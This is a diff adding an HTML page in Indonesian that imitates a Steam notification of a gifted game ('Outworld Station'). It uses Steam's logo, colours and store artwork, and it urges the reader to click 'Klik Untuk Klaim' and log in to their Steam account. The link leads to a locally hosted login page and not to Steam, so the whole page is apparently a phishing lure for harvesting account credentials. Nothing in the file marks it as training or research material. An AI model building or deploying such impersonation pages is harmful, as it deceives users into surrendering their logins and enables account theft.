@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Anda Mendapatkan Hadiah Game di Steam!</title>
+    <style>
+      body {
+        font-family: "Motiva Sans", sans-serif; /* Font Steam */
+        line-height: 1.6;
+        color: #c6d4df;
+        background-color: #171a21;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .gift-card {
+        background-color: #2a475e;
+        border-radius: 5px;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+        padding: 20px;
+        text-align: center;
+        width: 450px;
+      }
+      .steam-logo {
+        max-width: 100px;
+        margin-bottom: 15px;
+      }
+      h2 {
+        color: #fff;
+        margin-bottom: 10px;
+      }
+      .game-preview {
+        width: 100%;
+        max-height: 200px;
+        object-fit: cover;
+        border-radius: 3px;
+        margin-bottom: 15px;
+      }
+      .game-info {
+        margin-bottom: 20px;
+        padding: 15px;
+        background-color: #1f3144;
+        border-radius: 5px;
+      }
+      .game-title {
+        font-size: 1.6em;
+        color: #fff;
+        font-weight: bold;
+        margin-bottom: 5px;
+      }
+      .gifted-by {
+        font-size: 0.9em;
+        color: #8f98a0;
+      }
+      .message {
+        color: #fff;
+        margin-bottom: 15px;
+      }
+      .button {
+        display: inline-block;
+        padding: 12px 25px;
+        background-color: #67c1f5;
+        color: #fff;
+        text-decoration: none;
+        border-radius: 3px;
+        font-size: 1.1em;
+        font-weight: bold;
+      }
+      .button:hover {
+        background-color: #33aaff;
+      }
+      .footer {
+        margin-top: 20px;
+        font-size: 0.8em;
+        color: #8f98a0;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="gift-card">
+      <img
+        src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png"
+        alt="Steam Logo"
+        class="steam-logo"
+        width="80"
+      />
+      <h2>Selamat! Anda Mendapatkan Hadiah Game!</h2>
+      <img
+        src="https://shared.cloudflare.steamstatic.com/store_item_assets/steam/apps/3242950/a41182de36003f4eac3a65f20dbcce77b3a0ead2/header.jpg?t=1745438112"
+        alt="Outworld Station"
+        class="game-preview"
+      />
+      <div class="game-info">
+        <p class="game-title">Outworld Station</p>
+        <p class="gifted-by">Dihadiahkan oleh: Steam Group</p>
+      </div>
+      <p class="message">
+        Silakan login ke akun Steam Anda untuk menerima dan menambahkan game ini
+        ke perpustakaan Anda:
+      </p>
+      <a href="http://127.0.0.1:3000/login.html" class="button"
+        >Klik Untuk Klaim</a
+      >
+      <p class="footer">Selamat bermain!</p>
+    </div>
+  </body>
+</html>
